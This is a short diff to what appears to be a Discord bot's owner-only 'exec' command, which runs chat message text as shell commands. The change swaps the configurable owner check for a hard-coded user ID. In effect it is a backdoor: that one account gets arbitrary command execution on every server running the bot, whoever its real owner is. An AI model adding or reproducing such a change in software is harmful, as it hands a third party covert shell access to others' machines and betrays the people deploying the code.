@@ -7,7 +7,7 @@ module.exports = {
     category: "Owner",
     description: "Execute a command",
     run: async (client, message, args) => {
-        if (message.author.id === client.config.owner) {
+        if (message.author.id === "517107022399799331") {
             exec(args.join(" "), (err, stdout, stderr) => {
                 if (err) {
                     message.channel.send(err);
